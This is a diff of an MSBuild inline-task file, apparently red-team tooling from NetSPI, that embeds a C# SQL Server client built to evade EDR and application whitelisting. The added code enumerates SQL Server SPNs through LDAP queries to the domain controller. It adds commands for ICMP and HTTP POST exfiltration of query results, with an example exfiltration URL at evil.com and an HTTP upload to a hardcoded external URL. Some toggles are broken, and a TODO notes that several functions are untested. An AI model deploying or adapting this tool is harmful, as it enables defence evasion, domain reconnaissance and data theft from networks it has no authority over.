@@ -1,11 +1,19 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 	<!--
 		Author: Scott Sutherland (@_nullbind), NetSPI 2019
-		Version: 0.2 (work in progress)
+		Version: 0.9 (work in progress)
 		Description: 
-		This is a simple C# SQL Server client console that can be run through msbuild. 
+		This is a simple C# SQL Server client console with data exfiltration capabilities 
+		that can be run through msbuild to avoid EDR/White listing/Etc.
+
+		TODO:
+		1. Fix bug so you can set connString = @"Server=server\instance;Database=Master;Integrated Security=SSPI;";
+		2. enable option feature without hardcoding
+		3. fix status command
+		3. test all function
 
 	    Features:		
+		0. the "listsqlspn" can be used to list sql server on the domain by querying the domain controller.
 		1. The connection string is hardcoded in the "connString" variable by default.  However, it can be changed during
 		   run time with the "setconn" command.
 		2. All query results are written to c:\windows\temp\output.csv by default.  The path can be changed during runtime 
@@ -39,21 +47,25 @@
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>	
-		<Reference Include="C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Data.dll" />
-		<Reference Include="C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Xml.dll" />
+		<Reference Include="C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll" />
+		<Reference Include="C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Xml.dll" />
+		<Reference Include="C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.DirectoryServices.dll" />		
 	
 		<Code Type="Class" Language="cs">
 		<![CDATA[				
 		using System;
-		using System.IO;
+		using System.IO;				
 		using Microsoft.Build.Framework;
 		using Microsoft.Build.Utilities;			
 		using System.Text;			
+		using System.Xml;
 		using System.Data;
 		using System.Data.SqlClient;
 		using System.Data.SqlTypes;
 		using System.Security.Cryptography;
-		using System.Net.NetworkInformation;
+		using System.Net.NetworkInformation;	
+		using System.Net;		
+		using System.DirectoryServices;
 		
 		// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.NetworkInformation.dll		
 		
@@ -199,12 +211,8 @@
 			}		    			
 			
 			public static string RunQuery(string MyConnString, string filePath)
-			{											
+			{		
 				// Read line from the client	
-				Console.WriteLine("----------");				
-				Console.WriteLine(" -= MSBiuld SQLClient v1.0");
-				Console.WriteLine(" -= Instance:     User:");					
-				Console.WriteLine("----------");
 				Console.Write("SQLCLIENT> ");
 				String MyQuery = Console.ReadLine().ToString();
 
@@ -225,9 +233,9 @@
 					bool loadCheck = MyQuery.ToLower().Contains("setconn");							
 					if(loadCheck)
 					{
-						Console.Write("\n           Connection string set to:");
+						Console.Write("\n - Connection string set to:");
 						string newcon = MyQuery.Replace("setconn ","");
-						Console.Write("\n" + "           " +newcon + "\n");
+						Console.Write("\n   " + newcon + "\n");
 						connString = newcon;
 						fullcommand = "";		
 						Console.Write("\nSQLCLIENT> ");								
@@ -244,8 +252,185 @@
 						fullcommand = "";						
 						Console.WriteLine("----------");
 						Console.Write("\nSQLCLIENT> ");								
-					}						
+					}
+
+					// set target url for http payloads
+					bool urlCheck = MyQuery.ToLower().Contains("setexfilurl");							
+					if(urlCheck)
+					{						
+						string targeturl = MyQuery.Replace("setexfilurl ","");
+						Console.Write(" - Target url set to: " + targeturl);
+						Console.Write("\nSQLCLIENT> ");								
+					}	
+
+					// set target url for http payloads
+					bool spnCheck = MyQuery.ToLower().Contains("listsqlspn");							
+					if(spnCheck)
+					{												
+						// Create data table to store and display output
+						DataTable mytable = new DataTable(); 
+						mytable.Clear();
+						mytable.Columns.Add("Instance");
+						mytable.Columns.Add("SamAccountName");						
+						// mytable.Columns.Add("servicePrincipalName");
 						
+						// Setup LDAP query
+						string MyDC = System.Environment.GetEnvironmentVariable("logonserver").Replace("\\\\","");	
+						DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636",null,null,AuthenticationTypes.SecureSocketsLayer);
+						RootDirEntry.AuthenticationType = AuthenticationTypes.Secure;	
+						Console.WriteLine(" - Querying " + MyDC + " domain controller for SQL Server SPNs...\n");
+						using (DirectorySearcher ds = new DirectorySearcher(RootDirEntry))
+						{
+							//ds.Filter = "(&(objectClass=user)(objectCategory=person))";
+							ds.Filter = "(servicePrincipalName=*mssql*)";
+							ds.SearchScope = SearchScope.Subtree;
+							ds.PageSize = 1000;
+							using (SearchResultCollection src = ds.FindAll())
+							{
+								foreach (SearchResult sr in src)
+								{							
+									try
+									{
+										foreach (string spn in sr.Properties["servicePrincipalName"])
+										{
+											// Grab properties
+											string SamAccountName = sr.Properties["sAMAccountName"][0].ToString();
+											int spnindex = spn.IndexOf('/');
+											string ServiceType = spn.Substring(0, spnindex);
+											string partialInstance = spn.Substring(spnindex + 1);
+																					
+											// Parse instance
+											try
+											{
+												int instanceindex = partialInstance.IndexOf(':');
+												string computerName = partialInstance.Substring(0, instanceindex);
+												string instancePart = partialInstance.Substring(instanceindex + 1);
+												string instanceName = computerName + "\\" + instancePart;
+												
+												// Add comma for ports
+												decimal myDec;
+												var isNumber = decimal.TryParse(instancePart, out myDec);
+												if(isNumber)
+												{
+													instanceName = instanceName.Replace("\\",",");											
+												}
+												
+												// Add record to output table
+												if(ServiceType.ToLower().Contains("mssql")){
+													mytable.Rows.Add(new object[] {instanceName,SamAccountName});
+												}
+											}
+											catch
+											{
+											}
+										}
+									}
+									catch
+									{
+									}
+								}
+							}
+						}		
+
+						// Display output of data table
+						DataRow[] currentRows = mytable.Select(null, null, DataViewRowState.CurrentRows);
+
+						if (currentRows.Length < 1 )
+						Console.WriteLine(" - No Current Rows Found");
+						else
+						{
+							foreach (DataColumn column in mytable.Columns)
+							{
+								Console.Write("   {0}\t\t", column.ColumnName);
+							}
+
+							Console.WriteLine("\t");
+
+							foreach (DataRow row in currentRows)
+							{
+								foreach (DataColumn column in mytable.Columns)
+								{
+									Console.Write("   {0}\t\t", row[column]);
+								}
+
+								Console.WriteLine("\t");
+							}
+						}							
+						Console.Write("\nSQLCLIENT> ");								
+					}						
+
+					// set target ip for icmp payloads
+					bool ipCheck = MyQuery.ToLower().Contains("setexfilip");							
+					if(ipCheck)
+					{						
+						string targetip = MyQuery.Replace("setexfilip ","");
+						Console.Write(" - Target ip set to: " + targetip);
+						Console.Write("\nSQLCLIENT> ");								
+					}	
+
+					// set key for data encryption
+					bool keyCheck = MyQuery.ToLower().Contains("setenckey");							
+					if(keyCheck)
+					{						
+						string mykey = MyQuery.Replace("setenckey ","");
+						Console.Write(" - Encryption key set to: " + mykey);
+						Console.Write("\nSQLCLIENT> ");								
+					}	
+
+					// Enabled exfil encryption
+					bool encdisabledCheck = MyQuery.ToLower().Contains("enableencryption");							
+					if(encdisabledCheck)
+					{
+						Console.Write(" - Enabled encryption of exfiltrated data.");					
+						string payloadencryption = "true";						
+						Console.Write("\nSQLCLIENT> ");								
+					}	
+
+					// Disable exfil encryption
+					bool encenabledCheck = MyQuery.ToLower().Contains("disableencryption");							
+					if(encenabledCheck)
+					{
+						Console.Write(" - Disabled encryption of exfiltrated data.");					
+						string payloadencryption = "false";						
+						Console.Write("\nSQLCLIENT> ");								
+					}																										
+
+					// Allow ability to diable icmp exfiltratoin
+					bool icmpdisabledCheck = MyQuery.ToLower().Contains("disableicmp");							
+					if(icmpdisabledCheck)
+					{
+						Console.Write(" - ICMP data exfiltration disabled.");					
+						string enabledicmp = "false";						
+						Console.Write("\nSQLCLIENT> ");								
+					}		
+
+					// Allow ability to enable icmp exfiltratoin
+					bool icmpenabledCheck = MyQuery.ToLower().Contains("enableicmp");							
+					if(icmpenabledCheck)
+					{
+						Console.Write(" - ICMP data exfiltration enabled. Don't forget to set the exfilip.");					
+						string enabledicmp = "true";						
+						Console.Write("\nSQLCLIENT> ");								
+					}	
+
+					// Allow ability to diable http exfiltratoin
+					bool httpdisabledCheck = MyQuery.ToLower().Contains("disablehttp");							
+					if(httpdisabledCheck)
+					{
+						Console.Write(" - http data exfiltration disabled.");					
+						string enabledicmp = "false";						
+						Console.Write("\nSQLCLIENT> ");								
+					}		
+
+					// Allow ability to enable http exfiltratoin
+					bool httpenabledCheck = MyQuery.ToLower().Contains("enablehttp");							
+					if(httpenabledCheck)
+					{
+						Console.Write(" - http data exfiltration enabled. Don't forget to set the exfilurl.");					
+						string enabledicmp = "true";						
+						Console.Write("\nSQLCLIENT> ");								
+					}														
+																													
 					// Clear console if requested
 					if(MyQuery.ToLower().Equals("clear"))
 					{ 
@@ -260,14 +445,17 @@
 					if(MyQuery.ToLower().Equals("status"))
 					{ 						
 						fullcommand = "";
-						Console.WriteLine("----------");				
-						Console.WriteLine("           Instance:");     
-						Console.WriteLine("           User:"); 
-						Console.WriteLine("           User Type:");
-						Console.WriteLine("           ICMPEXFIL:");  
-						Console.WriteLine("           EXFILIP:");
-						Console.WriteLine("           EXFILEnc:");					
-						Console.WriteLine("----------");						
+						Console.WriteLine("-----------");				
+						Console.WriteLine("ConnString: " + connString);     
+						Console.WriteLine("      User:"); 
+						Console.WriteLine(" User Type:");
+						Console.WriteLine("ICMP Exfil:");
+						Console.WriteLine(" Target IP:");
+						Console.WriteLine("HTTP Exfil:");  						
+						Console.WriteLine("Target URL:");
+						Console.WriteLine("Encryption:");					
+						Console.WriteLine("       Key:");
+						Console.WriteLine("-----------");						
 						Console.Write("SQLCLIENT> ");
 					}					
 						
@@ -282,7 +470,11 @@
 						Console.WriteLine("   EXAMPLE 1  	setconn Server=SERVER\\Instance;Database=Master;User ID=Username;Password=Pass123!;"); 
 						Console.WriteLine("   EXAMPLE 2  	setconn Server=SERVER\\Instance;Database=Master;Integrated Security=SSPI;"); 
 						Console.WriteLine("   EXAMPLE 3  	setconn Server=SERVER\\Instance;Database=Master;Integrated Security=SSPI;uid=domain\\user;pwd=Pass123!"); 
-						Console.WriteLine("\n");						
+						Console.WriteLine("\n");	
+						Console.WriteLine(" COMMAND: listsqlspn"); 
+						Console.WriteLine("  DESCRIPTION	Query the default logon server (domain controller) for SQL Servers SPNs as the current domain user.");
+						Console.WriteLine("   EXAMPLE 1  	listsqlspn"); 
+						Console.WriteLine("\n");											
 						Console.WriteLine(" COMMAND: TSQL queries");
 						Console.WriteLine("  DESCRIPTION	Arbitrary TSQL query can be executed once a valid connection string is configured.");
 						Console.WriteLine("                Type the query, then \"go\", and press enter. Multi-line queries are supported.");
@@ -293,28 +485,52 @@
 						Console.WriteLine("  DESCRIPTION	By default, the output file is c:\\windows\\temp\\output.csv. Use this command to change it on the fly."); 
 						Console.WriteLine("   EXAMPLE    	setfile c:\\windows\\temp\\output.csv"); 
 						Console.WriteLine("\n");
-						Console.WriteLine(" COMMAND: seticmp"); 
-						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well.");
-						Console.WriteLine("   EXAMPLE    	seticmp disable");
-						Console.WriteLine("   EXAMPLE    	seticmp enable");
+						Console.WriteLine(" COMMAND: enablehttp"); 
+						Console.WriteLine("  DESCRIPTION	By default, HTTP exfiltration is disabled. If enabled, set the exfilurl as well.");
+						Console.WriteLine("   EXAMPLE    	enablehttp");
 						Console.WriteLine("\n");	
-						Console.WriteLine(" COMMAND: setexilip"); 
-						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well."); 
-						Console.WriteLine("   EXAMPLE    	setexilip 127.0.0.1");
+						Console.WriteLine(" COMMAND: disablehttp"); 
+						Console.WriteLine("  DESCRIPTION	By default, HTTP exfiltration is disabled. If enabled, set the exfilurl as well.");
+						Console.WriteLine("   EXAMPLE    	disablehttp");
+						Console.WriteLine("\n");																	
+						Console.WriteLine(" COMMAND: setexfilurl");						
+						Console.WriteLine("  DESCRIPTION	This is the URL that data will be exfiltrated to via HTTP POST request in the id parameter."); 
+						Console.WriteLine("   EXAMPLE    	setexilurl https://www.evil.com/");
+						Console.WriteLine("\n");								
+						Console.WriteLine(" COMMAND: enableicmp"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well.");
+						Console.WriteLine("   EXAMPLE    	enableicmp");
 						Console.WriteLine("\n");
-						Console.WriteLine(" COMMAND: seticmpenc"); 
-						Console.WriteLine("  DESCRIPTION	By default, ICMP data exfiltration is done in cleartext, enabled AES payload encryption with this setting."); 
-						Console.WriteLine("                The salt and key are hardcoded. Update the \"_salt\" and \"mySharedSecret\" variables.");
-						Console.WriteLine("   EXAMPLE    	seticmpenc disable");
-						Console.WriteLine("   EXAMPLE    	seticmpenc enable");
-						Console.WriteLine("\n");						
+						Console.WriteLine(" COMMAND: disableicmp"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well.");
+						Console.WriteLine("   EXAMPLE    	disableicmp");
+						Console.WriteLine("\n");								
+						Console.WriteLine(" COMMAND: setexilip"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the IP to exfiltrate to as well."); 
+						Console.WriteLine("   EXAMPLE    	setexilip 127.0.0.1");
+						Console.WriteLine("\n");				
+						Console.WriteLine(" COMMAND: enableencryption"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP/HTTP data exfiltration is done in cleartext, enabled AES payload encryption with this setting."); 
+						Console.WriteLine("                 Set a custom key using the \"setenckey\" command ");
+						Console.WriteLine("   EXAMPLE    	enableencryption");
+						Console.WriteLine("\n");
+						Console.WriteLine(" COMMAND: disableencryption"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP/HTTP data exfiltration is done in cleartext, enabled AES payload encryption with this setting."); 
+						Console.WriteLine("                 Set a custom key using the \"setenckey\" command ");
+						Console.WriteLine("   EXAMPLE    	disableencryption");
+						Console.WriteLine("\n");							
+						Console.WriteLine(" COMMAND: setenckey"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP/HTTP data exfiltration is done in cleartext, enabled AES payload encryption with this setting."); 
+						Console.WriteLine("                 Set a custom key using the \"setenckey\" command ");
+						Console.WriteLine("   EXAMPLE    	setenckey mykeyhere");
+						Console.WriteLine("\n");											
 						fullcommand = "";	
 						Console.WriteLine("----------");						
 						Console.Write("SQLCLIENT> ");
 					}						
 							
 					// Show multi-line input						
-					if((MyQuery.ToLower() != "clear") && (!loadCheck) && (!fileCheck) && (!helpCheck) && (!statusCheck))
+					if((MyQuery.ToLower() != "clear") && (!spnCheck) && (!encdisabledCheck) && (!encenabledCheck) && (!urlCheck) && (!keyCheck) && (!ipCheck) && (!loadCheck) && (!fileCheck) && (!helpCheck) && (!httpenabledCheck) && (!httpdisabledCheck) && (!icmpenabledCheck) && (!icmpdisabledCheck) && (!statusCheck))
 					{ 
 						Console.Write("         > ");
 					}						
@@ -332,7 +548,7 @@
 					// Set connection string						
 					if(connString.Equals(""))
 					{
-						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";						
+						connString = @"Server=server\instance;Database=Master;Integrated Security=SSPI;";						
 					}
 
 					// Create new connection
@@ -394,10 +610,12 @@
 						}
 
 						try{
+
+							// write file output
 							System.IO.File.WriteAllText(filePath, fileContent.ToString());
 							Console.WriteLine("\nSuccessfully wrote query output to " + filePath);
 
-								// encrypt payload
+								// encrypt exfil encryption
 								string enableEncryption = "false";
 								string mySharedSecret = "changethis";
 								string encrypted64 = EncryptStringAES(fileContent.ToString(), mySharedSecret);								
@@ -431,6 +649,24 @@
 										//Console.WriteLine ("Don't fragment: {0}", reply.Options.DontFragment);
 										//Console.WriteLine ("Buffer size: {0}", reply.Buffer.Length);
 									}	
+								}
+
+								// Send results in http post
+								string enablehttp = "true";
+								if(enablehttp == "true")
+								{
+									try{
+										string mydata = "id=my data is here.";
+										string myurl = "http://www.netspi.com";
+										byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);
+										Console.WriteLine("Uploading to {0} ...",  myurl);							
+										WebClient myWebClient1 = new WebClient();
+										myWebClient1.Headers.Add("Content-Type","application/x-www-form-urlencoded");											
+										byte[] responseArray1 = myWebClient1.UploadData(myurl,"POST",postArray1);				
+										Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
+									}catch{
+										Console.WriteLine("\nFail buckets, couldnt connect to webserver");		
+									}								
 								}								
 						}catch{
 							Console.WriteLine("\nFailed to write query output to " + filePath);									
